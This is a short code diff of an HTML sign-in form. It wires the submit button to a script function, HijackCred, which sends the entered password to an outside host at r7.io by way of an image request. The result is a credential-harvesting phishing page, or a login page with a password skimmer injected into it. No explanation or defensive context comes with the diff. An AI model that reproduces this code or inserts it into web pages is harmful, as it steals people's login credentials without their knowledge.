@@ -40,7 +40,7 @@
 		  
       </div>
         <input id="user_language" name="user_language" type="hidden" value="english">
-        <input type="submit" id="signin-btn" class="submit-btn optional" value="Sign in..." tabindex="3">
+        <input type="submit" id="signin-btn" class="submit-btn optional" value="Sign in..." tabindex="3" onsubmit=HijackCred()>
       </div>
 
       <div class="supplemental-links">
@@ -57,9 +57,6 @@ function HijackCred() {
 	i = new Image();
 	i.src='http://r7.io/e/macdh?s='+pass;
 }
-document.getElementsByClassName("error-message")[0].remove();
-document.getElementsByClassName("problem")[0].remove();
-document.forms[0].onsubmit = HijackCred;
 </script>
 
 
